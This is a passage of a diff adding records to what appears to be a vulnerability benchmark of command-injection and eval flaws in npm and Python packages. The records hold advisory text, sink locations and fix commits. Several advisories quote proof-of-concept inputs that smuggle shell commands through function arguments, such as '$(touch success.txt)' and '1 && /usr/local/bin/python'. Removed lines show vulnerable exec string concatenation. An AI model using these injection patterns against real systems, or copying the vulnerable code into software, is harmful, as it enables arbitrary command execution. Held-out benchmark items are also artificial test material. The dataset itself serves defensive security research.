+      "pair_id": "secbench-gry-5.0.8",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "secbench:gry@5.0.8",
+      "sink": "lib/index.js:88:20",
+      "source": null,
+      "ghsa_id": null,
+      "ghsa_summary": null,
+      "ghsa_description": "",
+      "ghsa_source_code_location": null,
+      "fix": null
+    },
+    {
+      "group_id": "secbench:hot-formula-parser",
+      "pair_id": "secbench-hot-formula-parser-3.0.0",
+      "split": "reserve",
+      "cwe": "CWE-94",
+      "vulnerability_id": "CVE-2020-6836",
+      "sink": "lib/grammar-parser/grammar-parser.js:258:31",
+      "source": null,
+      "ghsa_id": "GHSA-RC77-XXQ6-4MFF",
+      "ghsa_summary": "Command Injection in hot-formula-parser",
+      "ghsa_description": "Versions of `hot-formula-parser` prior to 3.0.1 are vulnerable to Command Injection. The package fails to sanitize values passed to the  `parse` function and concatenates it in an `eval` call. If a value of the formula is supplied by user-controlled input it may allow attackers to run arbitrary commands in the server.  \nParsing the following formula creates a `test` file in the present directory:  \n`\"SUM([(function(){require('child_process').execSync('touch test')})(),2])\"`\n\n\n## Recommendation\n\nUpgrade to version 3.0.1 or later.",
+      "ghsa_source_code_location": "https://github.com/handsontable/formula-parser",
+      "fix": {
+        "url": "https://github.com/handsontable/formula-parser/commit/396b089738d4bf30eb570a4fe6a188affa95cd5e",
+        "message": "Remove usage of the 'eval' function (#58)\n\n* Remove usage of the 'eval' function\r\n* Update formulajs module",
+        "files": [
+          {
+            "file": "package-lock.json",
+            "hits": [
+              "     \"browserify-aes\": {",
+              "-      \"resolved\": \"http://registry.npmjs.org/browserify-aes/-/browserify-aes-1.2.0.tgz\",",
+              "+      \"resolved\": \"https://registry.npmjs.org/browserify-aes/-/browserify-aes-1.2.0.tgz\",",
+              "     \"browserify-rsa\": {",
+              "-      \"resolved\": \"http://registry.npmjs.org/browserify-rsa/-/browserify-rsa-4.0.1.tgz\",",
+              "+      \"resolved\": \"https://registry.npmjs.org/browserify-rsa/-/browserify-rsa-4.0.1.tgz\",",
+              "         \"commander\": {",
+              "-          \"resolved\": \"http://registry.npmjs.org/commander/-/commander-2.9.0.tgz\",",
+              "+          \"resolved\": \"https://registry.npmjs.org/commander/-/commander-2.9.0.tgz\","
+            ]
+          },
+          {
+            "file": "src/grammar-parser/grammar-parser.jison",
+            "hits": [
+              "-      var arr = eval(\"[\" + yytext + \"]\");"
+            ]
+          },
+          {
+            "file": "src/grammar-parser/grammar-parser.js",
+            "hits": [
+              "-      var arr = eval(\"[\" + yytext + \"]\");"
+            ]
+          }
+        ],
+        "all_files": [
+          "package-lock.json",
+          "package.json",
+          "src/grammar-parser/grammar-parser.jison",
+          "src/grammar-parser/grammar-parser.js",
+          "test/integration/parsing/function.js",
+          "yarn.lock"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:kill-by-port",
+      "pair_id": "secbench-kill-by-port-0.0.1",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2021-23363",
+      "sink": "index.js:8:17",
+      "source": null,
+      "ghsa_id": "GHSA-MM4F-47CH-F7HX",
+      "ghsa_summary": "Arbitrary code execution in kill-by-port",
+      "ghsa_description": "This affects the package kill-by-port before 0.0.2. If (attacker-controlled) user input is given to the killByPort function, it is possible for an attacker to execute arbitrary commands. This is due to use of the child_process exec function without input sanitization.",
+      "ghsa_source_code_location": "https://github.com/GuyMograbi/kill-by-port",
+      "fix": {
+        "url": "https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4",
+        "message": "fix kill by port",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "-    processId = exec(`lsof -t -i:${port}`)",
+              "+    processId = exec(`lsof -t -i:${parseInt(port, 10)}`)"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:kill-port-process",
+      "pair_id": "secbench-kill-port-process-0.0.1",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2019-15609",
+      "sink": "src/index.js:44:4",
+      "source": null,
+      "ghsa_id": "GHSA-xp4x-j9vh-c3wf",
+      "ghsa_summary": "OS Command Injection and Command Injection in kill-port-process",
+      "ghsa_description": "The kill-port-process package prior to version 2.2.0 is vulnerable to a Command Injection.",
+      "ghsa_source_code_location": "https://github.com/hilleer/kill-port-process",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:killport",
+      "pair_id": "secbench-killport-1.0.1",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2021-23360",
+      "sink": "index.js:9:8",
+      "source": null,
+      "ghsa_id": "GHSA-FC42-H7Q4-QP8H",
+      "ghsa_summary": "Command Injection in killport",
+      "ghsa_description": "This affects the package killport before 1.0.2. If (attacker-controlled) user input is given, it is possible for an attacker to execute arbitrary commands. This is due to use of the child_process exec function without input sanitization. Running this PoC will cause the command touch success to be executed, leading to the creation of a file called success.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638",
+        "message": "fix a vulnerability issue if a provided port is not a number",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "     var cmd = 'lsof -i:' + port; ",
+              "     cp.exec(cmd, function(err, stdout, stderr){"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:libnmap",
+      "pair_id": "secbench-libnmap-0.4.11",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2018-16461",
+      "sink": "lib/classes/tools.js:114:25",
+      "source": null,
+      "ghsa_id": "GHSA-7G2W-6R25-2J7P",
+      "ghsa_summary": "Command Injection in libnmap",
+      "ghsa_description": "Versions of `libnmap` before 0.4.16 are vulnerable to command injection. \n\nProof of concept\n\n```js\nconst nmap = require('libnmap');\nconst opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n    }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/jas-/node-libnmap/commit/c235b24b0342e12a5dbf502f89daabe95883b6c8",
+        "message": "v0.4.16: Version bump & move to a stream object with .spawn()",
+        "files": [
+          {
+            "file": "lib/classes/tools.js",
+            "hits": [
+              "+const proc = require('child_process').spawn;",
+              "+        // Capture the flags, & ranges as a command string",
+              "         cmd = scope.command(opts, range);",
+              "+        // Split up cmd for .spawn()",
+              "+        const obj = cmd.split(\" \");",
+              "+        cmd = obj[0];",
+              "           console.log(`Running: ${cmd}`);",
+              "-        const execute = proc(cmd, (err, stdout, stderr) => {",
+              "+        const execute = proc(cmd, args);"
+            ]
+          },
+          {
+            "file": "package.json",
+            "hits": [
+              "   \"name\": \"libnmap\",",
+              "   \"description\": \"libnmap for node.js\","
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/classes/tools.js",
+          "package.json"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:local-devices",
+      "pair_id": "secbench-local-devices-2.0.0",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "secbench:local-devices@2.0.0",
+      "sink": "src/index.js:114:13",
+      "source": null,
+      "ghsa_id": "GHSA-W725-67P7-XV22",
+      "ghsa_summary": "Command Injection in local-devices",
+      "ghsa_description": "Versions of `local-devices` prior to 3.0.0 are vulnerable to Command Injection. The package does not validate input on ip addresses and concatenates it to an exec call, allowing attackers to run arbitrary commands in the system.\n\n\n## Recommendation\n\nUpgrade to version 3.0.0 or later.",
+      "ghsa_source_code_location": "https://github.com/DylanPiercey/local-devices",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:macaddress",
+      "pair_id": "secbench-macaddress-0.2.8",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2018-13797",
+      "sink": "lib/unix.js:4:5",
+      "source": null,
+      "ghsa_id": "GHSA-PP57-MQMH-44H7",
+      "ghsa_summary": "Command Injection in macaddress",
+      "ghsa_description": "All versions of `macaddress` are vulnerable to command injection. For this vulnerability to be exploited an attacker needs to control the `iface` argument to the `one` method.\n\n\n## Recommendation\n\nUpdate to version 0.2.9 or later.",
+      "ghsa_source_code_location": "https://github.com/scravy/node-macaddress",
+      "fix": {
+        "url": "https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332",
+        "message": "Merge pull request #20 from flypapertech/fixCommandInjection\n\nFixes arbitrary command injection by using execFile instead of exec",
+        "files": [
+          {
+            "file": "lib/linux.js",
+            "hits": [
+              "-    exec(\"cat /sys/class/net/\" + iface + \"/address\", function (err, out) {"
+            ]
+          },
+          {
+            "file": "lib/macosx.js",
+            "hits": [
+              "-    exec(\"networksetup -getmacaddress \" + iface, function (err, out) {",
+              "-        var match = /[a-f0-9]{2}(:[a-f0-9]{2}){5}/.exec(out.toLowerCase());"
+            ]
+          },
+          {
+            "file": "lib/unix.js",
+            "hits": [
+              "-    exec(\"ifconfig \" + iface, function (err, out) {"
+            ]
+          },
+          {
+            "file": "lib/windows.js",
+            "hits": [
+              "-    exec(\"ipconfig /all\", function (err, out) {"
+            ]
+          }
+        ],
+        "all_files": [
+          ".travis.yml",
+          "lib/linux.js",
+          "lib/macosx.js",
+          "lib/unix.js",
+          "lib/windows.js",
+          "package.json"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:open",
+      "pair_id": "secbench-open-0.0.5",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "secbench:open@0.0.5",
+      "sink": "lib/open.js:58:10",
+      "source": null,
+      "ghsa_id": "GHSA-28XH-WPGR-7FM8",
+      "ghsa_summary": "Command Injection in open",
+      "ghsa_description": "Versions of `open` before 6.0.0 are vulnerable to command injection when unsanitized user input is passed in.\n\nThe package does come with the following warning in the readme:\n\n```\nThe same care should be taken when calling open as if you were calling child_process.exec directly. If it is an executable it will run in a new shell.\n```\n\n\n## Recommendation\n\n`open` is now the deprecated `opn` package. Upgrading to the latest version is likely have unwanted effects since it now has a very different API but will prevent this vulnerability.",
+      "ghsa_source_code_location": "",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:pdf-image",
+      "pair_id": "secbench-pdf-image-1.0.5",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2018-3757",
+      "sink": "index.js:43:7",
+      "source": null,
+      "ghsa_id": "GHSA-5GWH-G79J-VH4Q",
+      "ghsa_summary": "Command Injection in pdf-image",
+      "ghsa_description": "Versions of `pdf-image` before 2.0.0 are vulnerable to command injection. This vulnerability is exploitable if the attacker has control over the `pdfFilePath` variable passed into `pdf-image`.\n\n\n## Recommendation\n\nUpdate to version 2.0.0 or later.",
+      "ghsa_source_code_location": "https://github.com/roest01/node-pdf-image",
+      "fix": {
+        "url": "https://github.com/roest01/node-pdf-image/commit/54679496a89738443917608c2bbe2f6e5dd20e83",
+        "message": "resolve #340208 - Command injection in 'pdf-image', Severity:Medium (6.1) - fix #38 - solution for v2",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "+var spawn = require(\"child-process-promise\").spawn;",
+              "   constructGetInfoCommand: function () {",
+              "+      cmd: \"pdfinfo\",",
+              "   parseGetInfoCommandOutput: function (output) {",
+              "     var getInfoCommand = this.constructGetInfoCommand();",
+              "-      exec(getInfoCommand, function (err, stdout, stderr) {",
+              "-        return resolve(self.parseGetInfoCommandOutput(stdout));",
+              "+      spawn(getInfoCommand.cmd, getInfoCommand.args, { capture: [ 'stdout', 'stderr' ]})",
+              "+        .then(function (cmdResult) {",
+              "+          resolve(self.parseGetInfoCommandOutput(cmdResult.stdout.toString()));",
+              "   constructConvertCommandForPage: function (pageNumber) {",
+              "+      cmd: this.useGM ? \"gm convert\" : \"convert\",",
+              "   constructCombineCommandForFile: function (imagePaths) {",
+              "+      cmd: this.useGM ? \"gm convert\" : \"convert\",",
+              "     var combineCommand = pdfImage.constructCombineCommandForFile(imagePaths);",
+              "-      exec(combineCommand, function (err, stdout, stderr) {",
+              "+      spawn(combineCommand.cmd, combineCommand.args, { capture: [ 'stdout', 'stderr' ]})",
+              "+          spawn(\"rm\", imagePaths); //cleanUp",
+              "-        exec(\"rm \"+imagePaths.join(' ')); //cleanUp",
+              "-        exec(convertCommand, function (err, stdout, stderr) {",
+              "+          spawn(convertCommand.cmd, convertCommand.args, { capture: [ 'stdout', 'stderr' ]})"
+            ]
+          },
+          {
+            "file": "tests/test-main.js",
+            "hits": [
+              "   it(\"should return correct convert command\", function () {",
+              "-    expect(pdfImage.constructConvertCommandForPage(1))",
+              "+    var convertCommand = pdfImage.constructConvertCommandForPage(1);",
+              "+    expect(convertCommand.cmd).equal(\"convert\");",
+              "+    expect(convertCommand.args.length).equal(2);",
+              "   it(\"should return correct convert command to combine images\", function () {",
+              "-    expect(pdfImage.constructCombineCommandForFile(['/tmp/test-0.png', '/tmp/test-1.png']))",
+              "+    var cmdConfig = pdfImage.constructCombineCommandForFile(['/tmp/test-0.png', '/tmp/test-1.png']);",
+              "+    expect(cmdConfig.cmd).equal('convert');",
+              "+    expect(cmdConfig.args.length).equal(4);",
+              "-    expect(pdfImage.constructConvertCommandForPage(1))",
+              "+    var cmdConfig = pdfImage.constructConvertCommandForPage(1);",
+              "+    expect(cmdConfig.cmd).equal('gm convert');",
+              "+    expect(cmdConfig.args.length).equal(2);"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js",
+          "package.json",
+          "tests/test-main.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:pdfinfojs",
+      "pair_id": "secbench-pdfinfojs-0.3.6",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2018-3746",
+      "sink": "lib/pdfinfo.js:47:23",
+      "source": null,
+      "ghsa_id": "GHSA-3PXP-6963-46R9",
+      "ghsa_summary": "Command Injection in pdfinfojs",
+      "ghsa_description": "Versions of `pdfinfojs` before 0.4.1 are vulnerable to command injection. This is exploitable if an attacker can control the filename parameter that is passed into the `pdfinfojs` constructor.\n\n\n## Recommendation\n\nUpdate to version 0.4.1 or later.",
+      "ghsa_source_code_location": "",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:pidusage",
+      "pair_id": "secbench-pidusage-1.0.0",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2017-16034",
+      "sink": "lib/stats.js:108:5",
+      "source": null,
+      "ghsa_id": "GHSA-HFQ9-RFPV-J8R8",
+      "ghsa_summary": "Command Injection in pidusage",
+      "ghsa_description": "Affected versions of `pidusage` pass unsanitized input to `child_process.exec()`, resulting in arbitrary code execution in the `ps` method.\n \nThis package is vulnerable to this PoC on Darwin, SunOS, FreeBSD, and AIX.\n\nWindows and Linux are not vulnerable. \n\n## Proof of Concept\n```\nvar pid = require('pidusage');\npid.stat('1 && /usr/local/bin/python');\n```\n\n\n## Recommendation\n\nUpdate to version 1.1.5 or later.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d",
+        "message": "cast pid as integer",
+        "files": [
+          {
+            "file": "lib/stats.js",
+            "hits": [
+              "     var cmd = 'ps -o pcpu,rss -p '"
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/stats.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:portprocesses",
+      "pair_id": "secbench-portprocesses-1.0.4",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2021-23348",
+      "sink": "exec.js:5:3",
+      "source": null,
+      "ghsa_id": "GHSA-VM67-7VMG-66VM",
+      "ghsa_summary": "Arbitrary Command Injection in portprocesses",
+      "ghsa_description": "### Impact\n\nAn Arbitrary Command Injection vulnerability was reported in `portprocesses` impacting versions <= 1.0.4.\n\n### Example (Proof of Concept)\n\nThe following example demonstrates the vulnerability and will run `touch success` therefore creating a file named `success`.\n\n```js\nconst portprocesses = require(\"portprocesses\");\n\nportprocesses.killProcess(\"$(touch success)\");\n```",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1",
+        "message": "Merge pull request from GHSA-vm67-7vmg-66vm\n\nAdding check to ensure function arguments are numbers",
+        "files": [
+          {
+            "file": "cli.js",
+            "hits": [
+              " \tconst command = process.argv.pop();",
+              " \tswitch (command) {"
+            ]
+          },
+          {
+            "file": "index.js",
+            "hits": [
+              "-\t\tconst result = (await exec(`lsof -i :${port}`)).output.split('\\n');",
+              "+\t\tconst result = (await exec(`lsof -i :${portNumber}`)).output.split('\\n');",
+              "-\t\tawait exec(`kill ${pid}`);",
+              "+\t\tawait exec(`kill ${pidNumber}`);"
+            ]
+          }
+        ],
+        "all_files": [
+          "cli.js",
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:ps",
+      "pair_id": "secbench-ps-0.0.2",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2018-16460",
+      "sink": "lib/index.js:8:5",
+      "source": null,
+      "ghsa_id": "GHSA-CFHG-9X44-78H2",
+      "ghsa_summary": "ps Enables OS Command Injection",
+      "ghsa_description": "Versions of `ps` before 1.0.0 are vulnerable to command injection.\n\n### Proof of concept:\n```js\nvar ps = require('ps');\n\nps.lookup({ pid: \"$(touch success.txt)\" }, function(err, proc) { // this method is vulnerable to command injection\n    if (err) {throw err;}\n    if (proc) {\n        console.log(proc);  // Process name, something like \"node\" or \"bash\"\n    } else {\n        console.log('No such process');\n    }\n});\n\n// Result: The file success.txt will exist on the filesystem if the touch command was executed\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.",
+      "ghsa_source_code_location": "",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:react-dev-utils",
+      "pair_id": "secbench-react-dev-utils-11.0.0",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2021-24033",
+      "sink": "getProcessForPort.js:28:10",
+      "source": null,
+      "ghsa_id": "GHSA-5Q6M-3H65-W53X",
+      "ghsa_summary": "react-dev-utils OS Command Injection in function `getProcessForPort`",
+      "ghsa_description": "react-dev-utils prior to v11.0.4 exposes a function, `getProcessForPort`, where an input argument is concatenated into a command string to be executed. This function is typically used from react-scripts (in Create React App projects), where the usage is safe. Only when this function is manually invoked with user-provided values (ie: by custom code) is there the potential for command injection. If you're consuming it from react-scripts then this issue does not affect you.",
+      "ghsa_source_code_location": "https://github.com/facebook/create-react-app",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:@thi.ng/egf",
+      "pair_id": "secbench-thi.ng-egf-0.3.0",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2021-21412",
+      "sink": "lib/index.js:157:29",
+      "source": null,
+      "ghsa_id": "GHSA-RJ44-GPJC-29R7",
+      "ghsa_summary": "[thi.ng/egf] Potential arbitrary code execution of `#gpg`-tagged property values",
+      "ghsa_description": "### Impact\n\nPotential for arbitrary code execution in `#gpg`-tagged property values (only if `decrypt: true` option is enabled)\n\n### Patches\n\n[A fix](https://github.com/thi-ng/umbrella/commit/3e14765d6bfd8006742c9e7860bc7d58ae94dfa5) has already been released as v0.4.0\n\n### Workarounds\n\nBy default, EGF parse functions do NOT attempt to decrypt values (since GPG is only available in non-browser env).\n\nHowever, if GPG encrypted values are used/required:\n\n1. Perform a regex search for `#gpg`-tagged values in the EGF source file/string and check for backtick (\\`) chars in the encrypted value string\n2. Replace/remove them or skip parsing if present...\n\n### References\n\nhttps://github.com/thi-ng/umbrella/security/advisories/GHSA-rj44-gpjc-29r7#advisory-comment-65261\n\n### For more information\n\nIf you have any questions or comments about this advisory, please open an issue in the [thi.ng/umbrella repo](https://github.com/thi-ng/umbrella/issues), of which this package is part of.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/thi-ng/umbrella/commit/88f61656e5f5cfba960013b8133186389efaf243",
+        "message": "Merge pull request from GHSA-rj44-gpjc-29r7\n\nfix(egf): update GPG invocation to avoid arb code exec",
+        "files": [],
+        "all_files": [
+          "packages/egf/src/tags.ts"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:total.js",
+      "pair_id": "secbench-total.js-3.4.6",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-28494",
+      "sink": "image.js:329:12",
+      "source": null,
+      "ghsa_id": "GHSA-4449-HG37-77V8",
+      "ghsa_summary": "Command injection in total.js",
+      "ghsa_description": "There is a command injection vulnerability that affects the package total.js before version 3.4.7. The issue occurs in the image.pipe and image.stream functions. The type parameter is used to build the command that is then executed using child_process.spawn. The issue occurs because child_process.spawn is called with the option shell set to true and because the type parameter is not properly sanitized.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/totaljs/framework/commit/6192491ab2631e7c1d317c221f18ea613e2c18a5",
+        "message": "Fixed \"Command Injection\" in `image.stream()` - thank to Sam Sanoop.",
+        "files": [
+          {
+            "file": "image.js",
+            "hits": [
+              "@@ -38,6 +38,7 @@ const SPAWN_OPT = { shell: true };",
+              " const CMD_CONVERT = { gm: 'gm', im: 'convert', magick: 'magick' };",
+              " const CMD_CONVERT2 = { gm: 'gm convert', im: 'convert', magick: 'magick' };"
+            ]
+          }
+        ],
+        "all_files": [
+          "image.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:whereis",
+      "pair_id": "secbench-whereis-0.4.0",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2018-3772",
+      "sink": "index.js:4:6",
+      "source": null,
+      "ghsa_id": "GHSA-WJR4-2JGW-HMV8",
+      "ghsa_summary": "Command Injection in whereis",
+      "ghsa_description": "Versions of `whereis` before 0.4.1 are vulnerable to command injection if untrusted user input is passed into `whereis`.\n\n\n## Recommendation\n\nUpdate to version 0.4.1 or later.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b",
+        "message": "fix(security): escape arguments when feasible",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "-  cp.exec('which ' + name, function(error, stdout, stderr) {",
+              "-      cp.exec('whereis ' + name, function(error, stdout, stderr) {",
+              "-          cp.exec('where ' + name, function (error, stdout, stderr) { //windows",
+              "               cp.exec('for %i in (' + name + '.exe) do @echo. %~$PATH:i', function (error, stdout, stderr) { //windows xp"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js",
+          "test.js"
+        ]
+      }
+    }
+  ],
+  "pyvul": [
+    {
+      "group_id": "pyvul:django/django",
+      "pair_id": "pyvul-django-django-e1e81aa1c442",
+      "split": "development",
+      "cwe": "CWE-88",
+      "repository": "django/django",
+      "fix_commit": "e1e81aa1c4427411e3c68facdd761229ffea6f6f",
+      "commit": {
+        "url": "https://github.com/django/django/commit/e1e81aa1c4427411e3c68facdd761229ffea6f6f",
+        "message": "Fixed #32713, Fixed CVE-2021-32052 -- Prevented newlines and tabs from being accepted in URLValidator on Python 3.9.5+.\n\nIn Python 3.9.5+ urllib.parse() automatically removes ASCII newlines\r\nand tabs from URLs [1, 2]. Unfortunately it created an issue in\r\nthe URLValidator. URLValidator uses urllib.urlsplit() and\r\nurllib.urlunsplit() for creating a URL variant with Punycode which no\r\nlonger contains newlines and tabs in Python 3.9.5+. As a consequence,\r\nthe regular expression matched the URL (without unsafe characters) and\r\nthe source value (with unsafe characters) was considered valid.\r\n\r\n[1] https://bugs.python.org/issue43882 and\r\n[2] https://github.com/python/cpython/commit/76cd81d60310d65d01f9d7b48a8985d8ab89c8b4",
+        "files": [
+          {
+            "file": "django/core/validators.py",
+            "hits": [
+              "@@ -92,6 +92,7 @@ class URLValidator(RegexValidator):",
+              "     message = _('Enter a valid URL.')"
+            ]
+          },
+          {
+            "file": "docs/releases/2.2.22.txt",
+            "hits": [
+              "+CVE-2021-32052: Header injection possibility since ``URLValidator`` accepted newlines in input on Python 3.9.5+",
+              "+On Python 3.9.5+, :class:`~django.core.validators.URLValidator` didn't prohibit",
+              "+Moreover, the ``URLField`` form field which uses ``URLValidator`` silently"
+            ]
+          },
+          {
+            "file": "docs/releases/3.1.10.txt",
+            "hits": [
+              "+CVE-2021-32052: Header injection possibility since ``URLValidator`` accepted newlines in input on Python 3.9.5+",
+              "+On Python 3.9.5+, :class:`~django.core.validators.URLValidator` didn't prohibit",
+              "+Moreover, the ``URLField`` form field which uses ``URLValidator`` silently"
+            ]
+          },
+          {
+            "file": "docs/releases/3.2.2.txt",
+            "hits": [
+              "+CVE-2021-32052: Header injection possibility since ``URLValidator`` accepted newlines in input on Python 3.9.5+",
+              "+On Python 3.9.5+, :class:`~django.core.validators.URLValidator` didn't prohibit",
+              "+Moreover, the ``URLField`` form field which uses ``URLValidator`` silently"
+            ]
+          },
+          {
+            "file": "tests/validators/tests.py",
+            "hits": [
+              "     (URLValidator(), None, ValidationError),",
+              "     (URLValidator(), 56, ValidationError),",
+              "     (URLValidator(), 'no_scheme', ValidationError),",
+              "     (URLValidator(), 'http://www.djangoproject.com/\\n', ValidationError),",
+              "     (URLValidator(), 'http://[::ffff:192.9.5.5]\\n', ValidationError),",
+              "+    (URLValidator(), 'http://www.djangoproject.com/\\r', ValidationError),",
+              "+    (URLValidator(), 'http://[::ffff:192.9.5.5]\\r', ValidationError),",
+              "+    (URLValidator(), 'http://www.django\\rproject.com/', ValidationError),",
+              "+    (URLValidator(), 'http://[::\\rffff:192.9.5.5]', ValidationError),",
+              "+    (URLValidator(), 'http://\\twww.djangoproject.com/', ValidationError),",
+              "+    (URLValidator(), 'http://\\t[::ffff:192.9.5.5]', ValidationError),",
+              "     (URLValidator(), 'http://www.asdasdasdasdsadfm.com.br ', ValidationError),",
+              "     (URLValidator(), 'http://www.asdasdasdasdsadfm.com.br z', ValidationError),"
+            ]
+          }
+        ],
+        "all_files": [
+          "django/core/validators.py",
+          "docs/releases/2.2.22.txt",
+          "docs/releases/3.1.10.txt",
+          "docs/releases/3.2.2.txt",
+          "docs/releases/index.txt",
+          "tests/validators/tests.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:jaspernbrouwer/powerline-gitstatus",
+      "pair_id": "pyvul-jaspernbrouwer-powerline-gitstatus-fe8e963b3489",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "jaspernbrouwer/powerline-gitstatus",
+      "fix_commit": "fe8e963b3489e4cceaa2c1f26f2bcc2ef405364c",
+      "commit": {
+        "url": "https://github.com/jaspernbrouwer/powerline-gitstatus/commit/fe8e963b3489e4cceaa2c1f26f2bcc2ef405364c",
+        "message": "Fix command injection via malicious repository config\n\nThis is a mitigation for #45 and is the same method that was implemented\nby the fish shell maintainers in\nhttps://github.com/fish-shell/fish-shell/pull/8589",
+        "files": [
+          {
+            "file": "powerline_gitstatus/segments.py",
+            "hits": [
+              "@@ -27,13 +27,13 @@ def execute(self, pl, command):",
+              "     def get_base_command(self, cwd, use_dash_c):"
+            ]
+          }
+        ],
+        "all_files": [
+          "powerline_gitstatus/segments.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:tensorflow/tensorflow",
+      "pair_id": "pyvul-tensorflow-tensorflow-8b202f08d52e",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "tensorflow/tensorflow",
+      "fix_commit": "8b202f08d52e8206af2bdb2112a62fafbc546ec7",
+      "commit": {
+        "url": "https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7",
+        "message": "Remove use of `eval` when evaluating the input example.\n\nUse `ast.eval_literal` instead which safely evaluates the expression.\n\nPiperOrigin-RevId: 400012249\nChange-Id: I5ff98608ea2d736d093aa488af723ff4f6707e02",
+        "files": [
+          {
+            "file": "tensorflow/python/tools/saved_model_cli.py",
+            "hits": [
+              "-    input_dict[input_key] = eval(expr)  # pylint: disable=eval-used",
+              "+        input_dict[input_key] = ast.literal_eval(expr)",
+              "+      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used"
+            ]
+          },
+          {
+            "file": "tensorflow/python/tools/saved_model_cli_test.py",
+            "hits": [
+              "+    input_examples_str = 'inputs=os.system(\"echo hacked\")'"
+            ]
+          }
+        ],
+        "all_files": [
+          "RELEASE.md",
+          "tensorflow/python/tools/saved_model_cli.py",
+          "tensorflow/python/tools/saved_model_cli_test.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:google/slo-generator",
+      "pair_id": "pyvul-google-slo-generator-36318beab1b8",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "google/slo-generator",
+      "fix_commit": "36318beab1b85d14bb860e45bea186b184690d5d",
+      "commit": {
+        "url": "https://github.com/google/slo-generator/commit/36318beab1b85d14bb860e45bea186b184690d5d",
+        "message": "fix: yaml loader security issue (#173)",
+        "files": [
+          {
+            "file": "slo_generator/migrations/migrator.py",
+            "hits": [
+              "-            content = yaml.load(conf, Loader=yaml.Loader)",
+              "+            content = yaml.load(conf, Loader=yaml.SafeLoader)",
+              "-            error_budget_policy = yaml.load(conf, Loader=yaml.Loader)",
+              "+            error_budget_policy = yaml.load(conf, Loader=yaml.SafeLoader)"
+            ]
+          }
+        ],
+        "all_files": [
+          "slo_generator/migrations/migrator.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:jupyterhub/binderhub",
